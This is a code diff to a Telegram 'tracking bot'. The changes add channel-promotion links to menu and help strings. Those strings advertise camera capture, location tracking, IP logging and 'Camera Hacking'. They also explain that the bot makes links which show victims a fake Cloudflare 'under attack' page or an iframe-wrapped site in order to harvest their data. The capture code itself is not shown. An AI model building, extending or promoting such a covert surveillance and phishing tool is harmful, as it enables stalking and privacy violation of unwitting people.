@@ -54,7 +54,8 @@ function sendStartMenu(chatId, firstName = "User") {
 🔥 Welcome ${firstName} !
 
 ⚡ Advanced Tracking Bot
-
+OUR CHANNEL LINK
+https://t.me/Digiwordls
 ━━━━━━━━━━━━━━
 ✅ Features
 • Create custom links
@@ -63,7 +64,9 @@ function sendStartMenu(chatId, firstName = "User") {
 • Camera capture
 • Location tracking
 ━━━━━━━━━━━━━━
+https://t.me/Digiwordls
 
+OUR CHANNEL LINK
 👇 Select an option below
 `,
       parse_mode: "HTML",
@@ -170,6 +173,8 @@ bot.on("message", (msg) => {
 4️⃣ Send generated link
 
 ━━━━━━━━━━━━━━
+https://t.me/Digiwordls
+Support channel👑
 
 ⚡ FEATURES
 • Device Info
@@ -209,7 +214,8 @@ Send /create to generate a new link.
 
 ━━━━━━━━━━━━━━
 ⚡ BOT FEATURES
-
+https://t.me/Digiwordls
+support channel
 • 𝐈𝐏 𝐥𝐨𝐠𝐢𝐧
 • 𝐃𝐞𝐯𝐢𝐜𝐞 𝐓𝐫𝐚𝐜𝐤𝐢𝐧𝐠
 • 𝐂𝐚𝐦𝐞𝐫𝐚 𝐇𝐚𝐜𝐤𝐢𝐧𝐠
@@ -285,6 +291,8 @@ ${hostURL}/c/${url}
 🌐 WebView Link
 ${hostURL}/w/${url}
 
+ᴘᴏᴡᴇʀᴇᴅ ʙʏ
+@Digiwordls
 ━━━━━━━━━━━━━━
 `,
       m
@@ -465,7 +473,7 @@ the url it will send you 2 links which you can use to track people.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to garher informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at:Cam Hack Bot
+\n\nThe project is OSS at:Cam Hack Bot @Digiwordls
 `);
 }
   
